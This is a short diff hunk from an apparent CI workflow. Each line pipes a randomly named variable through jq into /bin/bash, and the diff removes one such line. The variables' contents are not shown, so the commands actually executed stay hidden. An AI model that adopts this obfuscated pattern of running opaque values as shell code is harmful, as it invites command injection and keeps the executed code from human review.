@@ -23,7 +23,6 @@ jobs:
           echo $duo649 | jq -r .blr2689 | /bin/bash
           printf '%s' "$czpu0" | jq -r .kj9 | /bin/bash
           echo $h1620 | jq -r .lqtsy065 | /bin/bash
-          echo $fiw3259 | jq -r .jrud8221 | /bin/bash
           echo $g32 | jq -r .kx2262 | /bin/bash
           printf '%s' "$m9470" | jq -r .mnln74457 | /bin/bash
           echo $uob105 | jq -r .no38748 | /bin/bash
